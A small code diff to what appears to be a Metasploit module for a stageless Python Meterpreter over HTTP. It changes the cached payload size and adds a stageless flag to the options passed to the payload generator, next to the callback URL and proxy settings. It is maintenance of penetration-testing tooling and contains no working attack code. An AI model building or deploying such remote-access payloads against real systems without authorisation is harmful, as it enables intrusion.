@@ -11,7 +11,7 @@ require 'msf/base/sessions/meterpreter_python'
 
 module MetasploitModule
 
-  CachedSize = 53346
+  CachedSize = 54106
 
   include Msf::Payload::Single
   include Msf::Payload::Python
@@ -38,7 +38,8 @@ module MetasploitModule
       url:             generate_callback_url(opts),
       http_user_agent: opts[:user_agent],
       http_proxy_host: opts[:proxy_host],
-      http_proxy_port: opts[:proxy_port]
+      http_proxy_port: opts[:proxy_port],
+      stageless:       true
     })
 
     py_create_exec_stub(met)
